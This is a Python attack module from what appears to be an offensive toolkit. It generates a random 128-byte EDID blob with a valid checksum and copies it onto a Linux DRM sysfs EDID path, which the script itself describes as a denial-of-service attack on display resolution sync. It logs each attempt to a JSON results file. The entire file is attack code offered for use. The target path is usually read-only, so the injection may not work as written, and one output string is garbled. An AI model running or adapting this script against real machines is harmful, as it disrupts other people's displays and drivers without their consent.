# modules/attacks/edid_corruptor.py

import os
import random
import argparse
import subprocess
from datetime import datetime
import json

OUT_PATH = "payloads/edid/edid_corrupted.bin"
LOG_PATH = "results/edid_dos_log.json"

def log_attack(success):
    os.makedirs("results", exist_ok=True)
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "file": OUT_PATH,
        "mode": "corruption",
        "success": success
    }
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(log)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def generate_corrupted_edid():
    os.makedirs("payloads/edid", exist_ok=True)
    edid = bytearray(os.urandom(128))
    edid[-1] = (256 - sum(edid[:-1]) % 256) % 256  # Fix checksum
    with open(OUT_PATH, "wb") as f:
        f.write(edid)
    return OUT_PATH

def inject_corrupted_edid(device="/sys/class/drm/card0-HDMI-A-1/edid"):
    edid_file = generate_corrupted_edid()
    try:
        subprocess.run(["cp", edid_file, device], check=True)
        print(f"[â] Corrupted EDID injected into {device}")
        log_attack(True)
    except Exception as e:
        print(f"[!] Injection failed: {e}")
        log_attack(False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="EDID corrupter (DoS against display resolution sync)")
    parser.add_argument("--device", default="/sys/class/drm/card0-HDMI-A-1/edid", help="EDID device path")
    args = parser.parse_args()
    inject_corrupted_edid(args.device)
